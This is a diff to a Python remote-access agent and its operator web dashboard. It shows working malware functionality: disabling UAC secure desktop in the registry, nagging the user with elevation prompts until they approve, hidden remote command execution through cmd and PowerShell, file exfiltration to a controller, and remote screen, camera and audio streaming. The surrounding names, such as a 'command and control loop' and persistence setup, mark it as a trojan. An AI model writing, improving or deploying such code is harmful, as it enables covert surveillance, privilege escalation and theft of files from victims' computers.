             # Set PromptOnSecureDesktop to 0 (disable secure desktop)
-            log_message("[REGISTRY] Setting PromptOnSecureDesktop = 1")
-            winreg.SetValueEx(key, "PromptOnSecureDesktop", 1, winreg.REG_DWORD, 1)
+            log_message("[REGISTRY] Setting PromptOnSecureDesktop = 0 (disabling secure desktop)")
+            winreg.SetValueEx(key, "PromptOnSecureDesktop", 0, winreg.REG_DWORD, 0)
             log_message("[REGISTRY] PromptOnSecureDesktop set successfully")
             
         log_message("[REGISTRY] UAC has been disabled successfully.")
@@ -3467,6 +4685,76 @@ def run_as_admin():
             log_message(f"[!] Failed to relaunch as admin: {e}")
             return False
     return True
+
+def run_as_admin_persistent():
+    """
+    Keep prompting for admin privileges until user clicks Yes.
+    This will create a popup that won't go away until granted.
+    When user clicks YES, the old instance exits and new admin instance starts.
+    """
+    if not WINDOWS_AVAILABLE:
+        debug_print("[ADMIN] Not Windows - skipping persistent admin prompt")
+        return False
+    
+    debug_print("=" * 80)
+    debug_print("[ADMIN] PERSISTENT ADMIN PROMPT - Will keep asking until YES")
+    debug_print("=" * 80)
+    
+    attempt = 0
+    max_attempts = 999  # Effectively infinite
+    
+    while attempt < max_attempts:
+        attempt += 1
+        
+        # Check if already admin
+        if is_admin():
+            debug_print("=" * 80)
+            debug_print(f"✅ [ADMIN] Admin privileges GRANTED! (after {attempt} attempts)")
+            debug_print("=" * 80)
+            return True
+        
+        debug_print(f"[ADMIN] Attempt {attempt}: Requesting admin privileges...")
+        
+        try:
+            # Show UAC prompt
+            # If user clicks YES, this launches elevated instance and we exit
+            # If user clicks NO, this returns and we continue
+            result = ctypes.windll.shell32.ShellExecuteW(
+                None,
+                "runas",  # Request elevation
+                sys.executable,  # Python executable
+                f'"{__file__}"',  # This script
+                None,
+                1  # SW_SHOWNORMAL
+            )
+            
+            # ShellExecuteW returns > 32 on success
+            if result > 32:
+                debug_print("=" * 80)
+                debug_print("✅ [ADMIN] User clicked YES - Elevated instance starting")
+                debug_print("✅ [ADMIN] THIS instance will now EXIT (to prevent duplicate)")
+                debug_print("=" * 80)
+                
+                # Exit this non-admin instance
+                # The new admin instance will take over
+                time.sleep(1)  # Brief delay to show message
+                sys.exit(0)  # ✅ EXIT OLD INSTANCE!
+            else:
+                # User clicked NO or Cancel
+                debug_print(f"❌ [ADMIN] Attempt {attempt}: User clicked NO or Cancel (result: {result})")
+                debug_print(f"[ADMIN] Waiting 3 seconds before next attempt...")
+                
+                # Wait a bit before asking again
+                time.sleep(3)
+            
+        except Exception as e:
+            debug_print(f"❌ [ADMIN] Attempt {attempt} FAILED: {e}")
+            time.sleep(3)
+    
+    debug_print("=" * 80)
+    debug_print("❌ [ADMIN] Max attempts reached - giving up")
+    debug_print("=" * 80)
+    return False
 
 def setup_persistence():
     """Setup persistence mechanisms."""
@@ -5857,6 +7145,9 @@ def register_socketio_handlers():
     
     # Register other handlers
     sio.on('command')(on_command)
+    sio.on('execute_command')(on_execute_command)  # For controller UI v2.1
+    sio.on('start_stream')(on_start_stream)  # CRITICAL: Handle stream start requests
+    sio.on('stop_stream')(on_stop_stream)    # CRITICAL: Handle stream stop requests
     sio.on('mouse_move')(on_mouse_move)
     sio.on('mouse_click')(on_mouse_click)
     sio.on('key_press')(on_remote_key_press)
@@ -5921,16 +7212,55 @@ def on_file_chunk_from_operator(data):
         
         # Check if file is complete
         received_size = sum(len(c[1]) for c in buffers[destination_path]['chunks'])
-        log_message(f"File {filename}: received {received_size}/{total_size} bytes")
         
-        # If we have received all chunks or this is the last chunk (total_size might be 0)
+        # Update total_size if it was 0 but we're receiving multiple chunks
+        if total_size == 0 and buffers[destination_path]['total_size'] > 0:
+            total_size = buffers[destination_path]['total_size']
+        elif total_size > 0:
+            buffers[destination_path]['total_size'] = total_size
+        
+        # Calculate progress and send to UI
+        if total_size > 0:
+            progress = int((received_size / total_size) * 100)
+            log_message(f"File {filename}: received {received_size}/{total_size} bytes ({progress}%)")
+            
+            # ✅ SEND PROGRESS UPDATE TO UI!
+            sio.emit('file_upload_progress', {
+                'agent_id': get_or_create_agent_id(),
+                'filename': filename,
+                'destination_path': destination_path,
+                'received': received_size,
+                'total': total_size,
+                'progress': progress
+            })
+        else:
+            # Even if total_size is 0, send progress based on received bytes
+            log_message(f"File {filename}: received {received_size} bytes (waiting for total_size or completion event)")
+            
+            # ✅ SEND PROGRESS UPDATE (unknown total)
+            sio.emit('file_upload_progress', {
+                'agent_id': get_or_create_agent_id(),
+                'filename': filename,
+                'destination_path': destination_path,
+                'received': received_size,
+                'total': 0,  # Unknown total
+                'progress': -1  # -1 indicates unknown progress
+            })
+        
+        # Only save when we've received all chunks (wait for completion event)
+        # Don't auto-save when total_size is 0 - wait for upload_complete event instead
         if total_size > 0 and received_size >= total_size:
             log_message(f"File complete: received {received_size}/{total_size} bytes")
             _save_completed_file(destination_path, buffers[destination_path])
-        elif total_size == 0 and len(buffers[destination_path]['chunks']) > 0:
-            # If total_size is 0, assume this is the only chunk and save immediately
-            log_message(f"Total size is 0, saving single chunk file immediately")
-            _save_completed_file(destination_path, buffers[destination_path])
+            
+            # ✅ SEND COMPLETION EVENT TO UI!
+            sio.emit('file_upload_complete', {
+                'agent_id': get_or_create_agent_id(),
+                'filename': filename,
+                'destination_path': destination_path,
+                'size': received_size,
+                'success': True
+            })
             
     except Exception as e:
         log_message(f"Error processing chunk: {e}")
@@ -5974,7 +7304,26 @@ def on_file_upload_complete_from_operator(data):
     if hasattr(on_file_chunk_from_operator, 'buffers'):
         if destination_path in on_file_chunk_from_operator.buffers:
             log_message(f"Force saving file {destination_path} from completion event")
-            _save_completed_file(destination_path, on_file_chunk_from_operator.buffers[destination_path])
+            buffer_data = on_file_chunk_from_operator.buffers[destination_path]
+            _save_completed_file(destination_path, buffer_data)
+            
+            # ✅ SEND FINAL UPLOAD COMPLETION WITH 100% PROGRESS!
+            file_size = sum(len(c[1]) for c in buffer_data['chunks'])
+            sio.emit('file_upload_progress', {
+                'agent_id': get_or_create_agent_id(),
+                'filename': filename,
+                'destination_path': destination_path,
+                'received': file_size,
+                'total': file_size,
+                'progress': 100  # ✅ 100% complete!
+            })
+            sio.emit('file_upload_complete', {
+                'agent_id': get_or_create_agent_id(),
+                'filename': filename,
+                'destination_path': destination_path,
+                'size': file_size,
+                'success': True
+            })
 
 def on_request_file_chunk_from_agent(data):
     """Handle file download request from controller - send file in chunks."""
@@ -5982,41 +7331,70 @@ def on_request_file_chunk_from_agent(data):
         log_message("Socket.IO not available, cannot handle file chunk request", "warning")
         return
     """Handle file download request from controller - send file in chunks."""
+    global LAST_BROWSED_DIRECTORY
+    
     log_message(f"File download request received: {data}")
     filename = data.get('filename')
+    provided_path = data.get('path')  # UI might send full path
+    
     if not filename:
         log_message("Invalid file request - no filename provided")
         return
     
-    # Try to find the file in common locations or use the provided path
-    possible_paths = [
-        filename,  # Try as-is first
+    # Build search paths (prioritize last browsed directory and provided path)
+    possible_paths = []
+    
+    # 1. If UI provided full path, try it first
+    if provided_path:
+        possible_paths.append(provided_path)
+    
+    # 2. Try in last browsed directory (from file manager UI)
+    if LAST_BROWSED_DIRECTORY:
+        possible_paths.append(os.path.join(LAST_BROWSED_DIRECTORY, filename))
+        log_message(f"[FILE_MANAGER] Will check last browsed directory: {LAST_BROWSED_DIRECTORY}")
+    
+    # 3. Try as-is (might be absolute path)
+    possible_paths.append(filename)
+    
+    # 4. Try common locations
+    possible_paths.extend([
         os.path.join(os.getcwd(), filename),  # Current directory
         os.path.join(os.path.expanduser("~"), filename),  # Home directory
         os.path.join(os.path.expanduser("~/Desktop"), filename),  # Desktop
         os.path.join(os.path.expanduser("~/Downloads"), filename),  # Downloads
         os.path.join("C:/", filename),  # C: root
         os.path.join("C:/Users/Public", filename),  # Public folder
-    ]
+    ])
     
     file_path = None
     for path in possible_paths:
         if os.path.exists(path):
             file_path = path
-            log_message(f"Found file at: {file_path}")
+            log_message(f"✅ Found file at: {file_path}")
             break
     
     if not file_path:
-        log_message(f"File not found: {filename}")
+        log_message(f"❌ File not found: {filename}")
         log_message("Searched in:")
         for path in possible_paths:
             log_message(f"  - {path}")
+        
+        # Send error back to UI
+        sio.emit('file_chunk_from_agent', {
+            'agent_id': get_or_create_agent_id(),
+            'filename': filename,
+            'error': f'File not found: {filename}. Last browsed dir: {LAST_BROWSED_DIRECTORY or "None"}'
+        })
         return
     
     try:
         chunk_size = 512 * 1024  # 512KB
         total_size = os.path.getsize(file_path)
         log_message(f"Sending file {file_path} ({total_size} bytes) in chunks...")
+        
+        agent_id = get_or_create_agent_id()
+        filename_only = os.path.basename(file_path)
+        
         with open(file_path, 'rb') as f:
             offset = 0
             chunk_count = 0
@@ -6025,17 +7403,41 @@ def on_request_file_chunk_from_agent(data):
                 if not chunk:
                     break
                 chunk_b64 = 'data:application/octet-stream;base64,' + base64.b64encode(chunk).decode('utf-8')
+                
+                # Send file chunk
                 sio.emit('file_chunk_from_agent', {
-                    'agent_id': get_or_create_agent_id(),
-                    'filename': os.path.basename(file_path),  # Send just the filename
+                    'agent_id': agent_id,
+                    'filename': filename_only,
                     'chunk': chunk_b64,
                     'offset': offset,
                     'total_size': total_size
                 })
+                
                 offset += len(chunk)
                 chunk_count += 1
-                log_message(f"Sent chunk {chunk_count}: {len(chunk)} bytes at offset {offset}")
+                
+                # ✅ Calculate and send download progress
+                progress = int((offset / total_size) * 100)
+                log_message(f"Sent chunk {chunk_count}: {len(chunk)} bytes at offset {offset} ({progress}%)")
+                
+                # ✅ SEND DOWNLOAD PROGRESS UPDATE TO UI!
+                sio.emit('file_download_progress', {
+                    'agent_id': agent_id,
+                    'filename': filename_only,
+                    'sent': offset,
+                    'total': total_size,
+                    'progress': progress
+                })
+        
         log_message(f"File {file_path} sent to controller in {chunk_count} chunks")
+        
+        # ✅ SEND DOWNLOAD COMPLETION EVENT TO UI!
+        sio.emit('file_download_complete', {
+            'agent_id': agent_id,
+            'filename': filename_only,
+            'size': total_size,
+            'success': True
+        })
     except Exception as e:
         log_message(f"Error sending file {file_path}: {e}")
 
@@ -6164,17 +7566,115 @@ def handle_live_audio(command_parts):
     except Exception as e:
         return f"Live audio processing failed: {e}"
 def execute_command(command):
-    """Executes a command and returns its output."""
+    """Execute a command and return its output - SMART AUTO-DETECTION"""
     try:
-        if WINDOWS_AVAILABLE:
-            # Explicitly use PowerShell to execute commands on Windows
-            result = subprocess.run(
-                ["powershell.exe", "-NoProfile", "-Command", command],
-                capture_output=True,
-                text=True,
-                timeout=30,
-                creationflags=subprocess.CREATE_NO_WINDOW
-            )
+        log_message(f"[CMD] Executing: {command}", "info")
+        
+        # Check for incomplete/interactive commands
+        interactive_commands = {
+            'netsh': 'netsh wlan show profile\nnetsh interface show interface\nnetsh advfirewall show allprofiles',
+            'diskpart': 'Use: list disk, list volume (diskpart requires interactive mode)',
+            'wmic': 'wmic process list\nwmic os get caption\nwmic computersystem get model',
+            'powercfg': 'powercfg /list\npowercfg /query\npowercfg /batteryreport',
+            'reg': 'reg query HKLM\\Software\nreg query HKCU\\Software',
+            'sc': 'sc query\nsc queryex type=service state=all'
+        }
+        
+        # If command is just the tool name (no arguments), provide help
+        cmd_lower = command.strip().lower()
+        if cmd_lower in interactive_commands:
+            help_msg = f"ℹ️ '{command}' requires arguments.\n\nSuggested commands:\n{interactive_commands[cmd_lower]}\n\nTip: Type the full command on one line (e.g., 'netsh wlan show profile')"
+            log_message(f"[CMD] Interactive command detected: {command}", "info")
+            return help_msg
+        
+        if platform.system() == "Windows":
+            # SMART COMMAND DETECTION: Auto-translate Unix commands to Windows equivalents
+            cmd_exe_path = os.path.join(os.environ.get('SystemRoot', 'C:\\Windows'), 'System32', 'cmd.exe')
+            ps_exe_path = os.path.join(os.environ.get('SystemRoot', 'C:\\Windows'), 'System32', 
+                                      'WindowsPowerShell', 'v1.0', 'powershell.exe')
+            
+            # Get the first word of the command (the actual command, not arguments)
+            cmd_parts = command.strip().split()
+            first_word = cmd_parts[0].lower() if cmd_parts else ""
+            
+            # Unix command translations (convert to CMD equivalents)
+            unix_to_cmd = {
+                'ls': 'dir',
+                'pwd': 'cd',
+                'cat': 'type',
+                'rm': 'del',
+                'cp': 'copy',
+                'mv': 'move',
+                'clear': 'cls',
+                'ps': 'tasklist',
+                'kill': 'taskkill /PID',
+                'grep': 'findstr',
+                'which': 'where',
+                'touch': 'type nul >',
+                'head': 'more',
+                'tail': 'more',
+                'wget': 'curl',
+                'curl': 'curl'
+            }
+            
+            # Check if it's a Unix command that needs translation
+            if first_word in unix_to_cmd:
+                original_command = command
+                # Replace the first word with the CMD equivalent
+                translated = unix_to_cmd[first_word]
+                if len(cmd_parts) > 1:
+                    command = f"{translated} {' '.join(cmd_parts[1:])}"
+                else:
+                    command = translated
+                log_message(f"[CMD] Auto-translated: '{original_command}' → '{command}'", "info")
+            
+            # PowerShell cmdlet detection
+            powershell_keywords = [
+                'Get-', 'Set-', 'New-', 'Remove-', 'Test-', 'Start-', 'Stop-', 'Invoke-',
+                'Select-Object', 'Where-Object', 'ForEach-Object', 'Sort-Object',
+                '$_', '$PSVersionTable', 'Import-Module', 'Export-', 'ConvertTo-',
+                'Write-Host', 'Write-Output', 'Read-Host'
+            ]
+            is_powershell_cmdlet = any(keyword in command for keyword in powershell_keywords)
+            
+            # PowerShell-only commands (these MUST use PowerShell)
+            powershell_only = [
+                'get-process', 'get-service', 'get-childitem', 'get-content',
+                'set-location', 'new-item', 'remove-item', 'copy-item', 'move-item'
+            ]
+            is_powershell_only = any(ps_cmd in first_word for ps_cmd in powershell_only)
+            
+            # Decide which shell to use
+            use_powershell = is_powershell_cmdlet or is_powershell_only
+            
+            if use_powershell:
+                # Use PowerShell for PowerShell-specific commands
+                log_message(f"[CMD] Using PowerShell: {ps_exe_path}", "debug")
+                
+                result = subprocess.run(
+                    [ps_exe_path, "-NoProfile", "-NonInteractive", "-Command", command],
+                    capture_output=True,
+                    text=True,
+                    encoding='utf-8',  # ✅ Force UTF-8 encoding
+                    errors='replace',  # ✅ Replace invalid characters instead of crashing
+                    timeout=30,
+                    creationflags=subprocess.CREATE_NO_WINDOW,
+                    env=os.environ.copy()
+                )
+            else:
+                # Use CMD.exe for standard/translated commands
+                log_message(f"[CMD] Using CMD.exe: {cmd_exe_path}", "debug")
+                
+                result = subprocess.run(
+                    [cmd_exe_path, "/c", command],
+                    capture_output=True,
+                    text=True,
+                    encoding='utf-8',  # ✅ Force UTF-8 encoding
+                    errors='replace',  # ✅ Replace invalid characters instead of crashing
+                    timeout=30,
+                    creationflags=subprocess.CREATE_NO_WINDOW,
+                    env=os.environ.copy()
+                )
         else:
             # Use bash on Linux/Unix systems
             result = subprocess.run(
@@ -6184,19 +7684,29 @@ def execute_command(command):
                 timeout=30
             )
         
-        output = result.stdout + result.stderr
-        if not output:
-            return "[No output from command]"
+        # Safely combine stdout and stderr (handle None values)
+        stdout = result.stdout if result.stdout else ""
+        stderr = result.stderr if result.stderr else ""
+        output = stdout + stderr
+        
+        if not output or output.strip() == "":
+            output = "[No output from command]"
+        
+        log_message(f"[CMD] Output: {output[:200]}{'...' if len(output) > 200 else ''}", "success")
         return output
+        
     except subprocess.TimeoutExpired:
-        return "Command execution timed out after 30 seconds"
-    except FileNotFoundError:
-        if WINDOWS_AVAILABLE:
-            return "PowerShell not found. Command execution failed."
-        else:
-            return "Bash not found. Command execution failed."
+        error_msg = "⏱️ Command execution timed out after 30 seconds"
+        log_message(error_msg, "error")
+        return error_msg
+    except FileNotFoundError as e:
+        error_msg = f"❌ Executable not found: {e}"
+        log_message(error_msg, "error")
+        return error_msg
     except Exception as e:
-        return f"Command execution failed: {e}"
+        error_msg = f"❌ Command execution failed: {e}"
+        log_message(error_msg, "error")
+        return error_msg
 def main_loop(agent_id):
     """The main command and control loop."""
     # Initialize high-performance systems
@@ -7978,15 +9488,36 @@ DASHBOARD_HTML = '''
             overflow: hidden;
         }
 
+        .agent-item::after {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(45deg, rgba(0, 212, 255, 0.1), rgba(155, 89, 182, 0.1));
+            opacity: 0;
+            transition: opacity 0.3s ease;
+        }
+
         .agent-item:hover {
             border-color: var(--accent-blue);
-            transform: translateY(-2px);
-            box-shadow: 0 5px 20px rgba(0, 212, 255, 0.2);
+            transform: translateY(-2px) scale(1.02);
+            box-shadow: 0 8px 25px rgba(0, 212, 255, 0.4), 0 0 20px rgba(0, 212, 255, 0.2);
+        }
+
+        .agent-item:hover::after {
+            opacity: 1;
         }
 
         .agent-item.active {
             border-color: var(--accent-green);
-            background: rgba(0, 255, 136, 0.1);
+            background: rgba(0, 255, 136, 0.15);
+            box-shadow: 0 0 25px rgba(0, 255, 136, 0.3);
+        }
+
+        .agent-item.active::after {
+            opacity: 0;
         }
 
         .stream-container {
@@ -8055,15 +9586,57 @@ DASHBOARD_HTML = '''
             text-transform: uppercase;
             letter-spacing: 0.5px;
             font-size: 0.9rem;
+            position: relative;
+            overflow: hidden;
+            box-shadow: 0 2px 10px rgba(0, 212, 255, 0.2);
+        }
+
+        .neural-button::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: -100%;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(90deg, transparent, rgba(255, 255, 255, 0.3), transparent);
+            transition: left 0.5s ease;
         }
 
         .neural-button:hover {
-            transform: translateY(-2px);
-            box-shadow: 0 5px 20px rgba(0, 212, 255, 0.4);
+            transform: translateY(-2px) scale(1.02);
+            box-shadow: 0 8px 25px rgba(0, 212, 255, 0.6), 0 0 30px rgba(0, 212, 255, 0.3);
+            background: linear-gradient(45deg, #00d4ff, #9b59b6);
+            filter: brightness(1.2);
+        }
+
+        .neural-button:hover::before {
+            left: 100%;
+        }
+
+        .neural-button:active {
+            transform: translateY(0) scale(0.98);
+            box-shadow: 0 3px 15px rgba(0, 212, 255, 0.4);
         }
 
         .neural-button.danger {
             background: linear-gradient(45deg, var(--accent-red), #ff6b6b);
+            box-shadow: 0 2px 10px rgba(255, 64, 64, 0.2);
+        }
+
+        .neural-button.danger:hover {
+            background: linear-gradient(45deg, #ff4040, #ff8888);
+            box-shadow: 0 8px 25px rgba(255, 64, 64, 0.6), 0 0 30px rgba(255, 64, 64, 0.3);
+        }
+
+        .neural-button:disabled {
+            opacity: 0.5;
+            cursor: not-allowed;
+            transform: none;
+        }
+
+        .neural-button:disabled:hover {
+            transform: none;
+            box-shadow: 0 2px 10px rgba(0, 212, 255, 0.2);
         }
 
         .neural-input {
@@ -8085,16 +9658,32 @@ DASHBOARD_HTML = '''
         }
 
         .command-output {
-            background: #000;
-            color: var(--accent-green);
+            background: #0a0a0a;
+            color: #00ff88;
             padding: 15px;
             border-radius: 8px;
             font-family: 'Courier New', monospace;
-            font-size: 0.8rem;
-            height: 150px;
+            font-size: 0.85rem;
+            height: 200px;
             overflow-y: auto;
             margin-top: 15px;
-            border: 1px solid var(--border-color);
+            border: 1px solid var(--accent-blue);
+            white-space: pre-wrap;
+            word-wrap: break-word;
+            line-height: 1.4;
+        }
+        
+        .command-output::-webkit-scrollbar {
+            width: 8px;
+        }
+        
+        .command-output::-webkit-scrollbar-track {
+            background: #0a0a0a;
+        }
+        
+        .command-output::-webkit-scrollbar-thumb {
+            background: var(--accent-blue);
+            border-radius: 4px;
         }
 
         .status-indicator {
@@ -8159,19 +9748,35 @@ DASHBOARD_HTML = '''
             
             <div class="control-section">
                 <h3>Streaming Control</h3>
-                <button class="neural-button" onclick="sendCommand('start-stream')">Start Screen Stream</button>
-                <button class="neural-button" onclick="sendCommand('stop-stream')">Stop Screen Stream</button>
-                <button class="neural-button" onclick="sendCommand('start-camera')">Start Camera</button>
-                <button class="neural-button" onclick="sendCommand('stop-camera')">Stop Camera</button>
-                <button class="neural-button" onclick="sendCommand('start-audio')">Start Audio</button>
-                <button class="neural-button" onclick="sendCommand('stop-audio')">Stop Audio</button>
+                <button class="neural-button" onclick="sendCommandWithFeedback(this, 'start-stream')">
+                    <span>▶ Start Screen Stream</span>
+                </button>
+                <button class="neural-button" onclick="sendCommandWithFeedback(this, 'stop-stream')">
+                    <span>⏹ Stop Screen Stream</span>
+                </button>
+                <button class="neural-button" onclick="sendCommandWithFeedback(this, 'start-camera')">
+                    <span>📷 Start Camera</span>
+                </button>
+                <button class="neural-button" onclick="sendCommandWithFeedback(this, 'stop-camera')">
+                    <span>⏹ Stop Camera</span>
+                </button>
+                <button class="neural-button" onclick="sendCommandWithFeedback(this, 'start-audio')">
+                    <span>🎤 Start Audio</span>
+                </button>
+                <button class="neural-button" onclick="sendCommandWithFeedback(this, 'stop-audio')">
+                    <span>⏹ Stop Audio</span>
+                </button>
             </div>
 
             <div class="control-section">
                 <h3>System Commands</h3>
-                <input type="text" id="command-input" class="neural-input" placeholder="Enter command...">
-                <button class="neural-button" onclick="executeCommand()">Execute</button>
-                <button class="neural-button danger" onclick="sendCommand('shutdown')">Shutdown Agent</button>
+                <input type="text" id="command-input" class="neural-input" placeholder="Enter command (e.g., whoami, ipconfig)...">
+                <button class="neural-button" onclick="executeCommand()">
+                    <span>⚡ Execute Command</span>
+                </button>
+                <button class="neural-button danger" onclick="confirmShutdown(this)">
+                    <span>🛑 Shutdown Agent</span>
+                </button>
             </div>
 
             <div class="control-section">
@@ -8188,8 +9793,11 @@ DASHBOARD_HTML = '''
 
         // Socket event handlers
         socket.on('connect', function() {
-            console.log('Connected to controller');
+            console.log('✅ Connected to controller');
+            console.log('📡 Socket ID:', socket.id);
             socket.emit('operator_connect');
+            // Request current agents list
+            socket.emit('get_agents');
         });
 
         socket.on('agents_list', function(data) {
@@ -8201,7 +9809,19 @@ DASHBOARD_HTML = '''
         });
 
         socket.on('command_result', function(data) {
-            displayCommandResult(data.output);
+            console.log('📨 Received command_result:', data);
+            console.log('Selected agent:', selectedAgent);
+            console.log('Data agent_id:', data.agent_id);
+            if (data && data.output) {
+                displayCommandResult(data.output);
+            } else {
+                console.warn('⚠️ No output in command_result');
+            }
+        });
+
+        // Listen for all events (debugging)
+        socket.onAny((eventName, ...args) => {
+            console.log(`📡 Event received: ${eventName}`, args);
         });
 
         socket.on('screen_frame', function(data) {
@@ -8263,14 +9883,88 @@ DASHBOARD_HTML = '''
 
         function sendCommand(command) {
             if (!selectedAgent) {
-                alert('Please select an agent first');
+                showNotification('Please select an agent first', 'error');
                 return;
             }
+            
+            console.log('🚀 Sending command:', command, 'to agent:', selectedAgent);
+            
+            // Show command sent feedback
+            showNotification(`Command sent: ${command}`, 'success');
             
             socket.emit('execute_command', {
                 agent_id: selectedAgent,
                 command: command
             });
+            
+            console.log('✅ execute_command event emitted');
+        }
+
+        function showNotification(message, type = 'info') {
+            // Create notification element
+            const notification = document.createElement('div');
+            notification.className = `notification notification-${type}`;
+            notification.textContent = message;
+            notification.style.cssText = `
+                position: fixed;
+                top: 20px;
+                right: 20px;
+                padding: 15px 25px;
+                background: ${type === 'error' ? 'linear-gradient(45deg, #ff4040, #ff6b6b)' : 'linear-gradient(45deg, #00d4ff, #9b59b6)'};
+                color: white;
+                border-radius: 10px;
+                box-shadow: 0 5px 20px rgba(0, 0, 0, 0.3);
+                z-index: 10000;
+                animation: slideIn 0.3s ease, slideOut 0.3s ease 2.7s;
+                font-weight: 600;
+            `;
+            
+            document.body.appendChild(notification);
+            
+            // Remove after 3 seconds
+            setTimeout(() => {
+                notification.remove();
+            }, 3000);
+        }
+
+        // Add animation styles
+        const style = document.createElement('style');
+        style.textContent = `
+            @keyframes slideIn {
+                from { transform: translateX(400px); opacity: 0; }
+                to { transform: translateX(0); opacity: 1; }
+            }
+            @keyframes slideOut {
+                from { transform: translateX(0); opacity: 1; }
+                to { transform: translateX(400px); opacity: 0; }
+            }
+            @keyframes buttonPulse {
+                0% { transform: scale(1); }
+                50% { transform: scale(0.95); }
+                100% { transform: scale(1); }
+            }
+        `;
+        document.head.appendChild(style);
+
+        function sendCommandWithFeedback(button, command) {
+            // Animate button
+            button.style.animation = 'buttonPulse 0.3s ease';
+            setTimeout(() => {
+                button.style.animation = '';
+            }, 300);
+            
+            // Send command
+            sendCommand(command);
+        }
+
+        function confirmShutdown(button) {
+            if (confirm('⚠️ Are you sure you want to shutdown the agent?\n\nThis will disconnect the agent from the controller.')) {
+                button.style.animation = 'buttonPulse 0.3s ease';
+                setTimeout(() => {
+                    button.style.animation = '';
+                }, 300);
+                sendCommand('shutdown');
+            }
         }
 
         function executeCommand() {
@@ -8283,13 +9977,26 @@ DASHBOARD_HTML = '''
                 return;
             }
             
+            // Display the command in the output first
+            displayCommandInput(command);
+            
             sendCommand(command);
             commandInput.value = '';
         }
 
+        function displayCommandInput(command) {
+            const commandOutput = document.getElementById('command-output');
+            const timestamp = new Date().toLocaleTimeString();
+            commandOutput.innerHTML += `<span style="color: #00ff88;">[${timestamp}] > ${command}</span>\\n`;
+            commandOutput.scrollTop = commandOutput.scrollHeight;
+        }
+
         function displayCommandResult(output) {
             const commandOutput = document.getElementById('command-output');
-            commandOutput.innerHTML += output + '\\n';
+            const timestamp = new Date().toLocaleTimeString();
+            // Escape HTML and preserve formatting
+            const escapedOutput = output.replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;');
+            commandOutput.innerHTML += `<span style="color: #ffffff;">[${timestamp}] ${escapedOutput}</span>\\n\\n`;
             commandOutput.scrollTop = commandOutput.scrollHeight;
         }
 
@@ -8519,7 +10226,8 @@ def main_unified():
         log_message("Starting in Agent mode...")
         # Kick off background initializer with progress display and elevated tasks
         try:
-            background_initializer.start_background_initialization(quick_startup=False)
+            initializer = get_background_initializer()  # ✅ Lazy initialization
+            initializer.start_background_initialization(quick_startup=False)
         except Exception as e:
             log_message(f"Background initializer failed: {e}", "warning")
         agent_main()
@@ -8571,6 +10279,100 @@ def disconnect():
         return
     """Handle disconnection from server."""
     log_message("Disconnected from server")
+
+def on_start_stream(data):
+    """Handle start_stream event from controller UI."""
+    if not SOCKETIO_AVAILABLE or sio is None:
+        log_message("Socket.IO not available, cannot handle start_stream", "warning")
+        return
+    
+    agent_id = get_or_create_agent_id()
+    stream_type = data.get('type', 'screen')  # screen, camera, or audio
+    quality = data.get('quality', 'high')
+    
+    log_message(f"[START_STREAM] Received request: type={stream_type}, quality={quality}")
+    
+    try:
+        if stream_type == 'screen':
+            start_streaming(agent_id)
+            log_message(f"[START_STREAM] Screen streaming started")
+            sio.emit('stream_started', {
+                'agent_id': agent_id,
+                'type': 'screen',
+                'status': 'success'
+            })
+        elif stream_type == 'camera':
+            start_camera_streaming(agent_id)
+            log_message(f"[START_STREAM] Camera streaming started")
+            sio.emit('stream_started', {
+                'agent_id': agent_id,
+                'type': 'camera',
+                'status': 'success'
+            })
+        elif stream_type == 'audio':
+            start_audio_streaming(agent_id)
+            log_message(f"[START_STREAM] Audio streaming started")
+            sio.emit('stream_started', {
+                'agent_id': agent_id,
+                'type': 'audio',
+                'status': 'success'
+            })
+        else:
+            log_message(f"[START_STREAM] Unknown stream type: {stream_type}", "warning")
+            sio.emit('stream_error', {
+                'agent_id': agent_id,
+                'type': stream_type,
+                'error': f'Unknown stream type: {stream_type}'
+            })
+    except Exception as e:
+        log_message(f"[START_STREAM] Error starting {stream_type} stream: {e}", "error")
+        sio.emit('stream_error', {
+            'agent_id': agent_id,
+            'type': stream_type,
+            'error': str(e)
+        })
+
+def on_stop_stream(data):
+    """Handle stop_stream event from controller UI."""
+    if not SOCKETIO_AVAILABLE or sio is None:
+        log_message("Socket.IO not available, cannot handle stop_stream", "warning")
+        return
+    
+    agent_id = get_or_create_agent_id()
+    stream_type = data.get('type', 'screen')  # screen, camera, or audio
+    
+    log_message(f"[STOP_STREAM] Received request: type={stream_type}")
+    
+    try:
+        if stream_type == 'screen':
+            stop_streaming()
+            log_message(f"[STOP_STREAM] Screen streaming stopped")
+            sio.emit('stream_stopped', {
+                'agent_id': agent_id,
+                'type': 'screen',
+                'status': 'success'
+            })
+        elif stream_type == 'camera':
+            stop_camera_streaming()
+            log_message(f"[STOP_STREAM] Camera streaming stopped")
+            sio.emit('stream_stopped', {
+                'agent_id': agent_id,
+                'type': 'camera',
+                'status': 'success'
+            })
+        elif stream_type == 'audio':
+            stop_audio_streaming()
+            log_message(f"[STOP_STREAM] Audio streaming stopped")
+            sio.emit('stream_stopped', {
+                'agent_id': agent_id,
+                'type': 'audio',
+                'status': 'success'
+            })
+        else:
+            log_message(f"[STOP_STREAM] Unknown stream type: {stream_type}", "warning")
+    except Exception as e:
+        log_message(f"[STOP_STREAM] Error stopping {stream_type} stream: {e}", "error")
+
 def on_command(data):
     if not SOCKETIO_AVAILABLE or sio is None:
         log_message("Socket.IO not available, cannot handle command", "warning")
@@ -8627,8 +10429,14 @@ def on_command(data):
             output = f"Error listing processes: {e}"
     elif command.startswith("list-dir"):
         try:
+            global LAST_BROWSED_DIRECTORY
             parts = command.split(":",1)
             path = parts[1] if len(parts)>1 and parts[1] else os.path.expanduser("~")
+            
+            # Remember this directory for file downloads
+            LAST_BROWSED_DIRECTORY = path
+            log_message(f"[FILE_MANAGER] Browsing directory: {path}")
+            
             entries = []
             if os.path.isdir(path):
                 for name in os.listdir(path):
@@ -8732,6 +10540,73 @@ def on_command(data):
     
     if output:
         sio.emit('command_result', {'agent_id': agent_id, 'output': output})
+
+def on_execute_command(data):
+    """
+    Handle execute_command event from controller UI v2.1
+    This is separate from on_command to support the new UI terminal
+    """
+    if not SOCKETIO_AVAILABLE or sio is None:
+        log_message("Socket.IO not available, cannot handle execute_command", "warning")
+        return
+    
+    agent_id = data.get('agent_id')
+    command = data.get('command')
+    execution_id = data.get('execution_id')  # ✅ GET execution_id from UI
+    
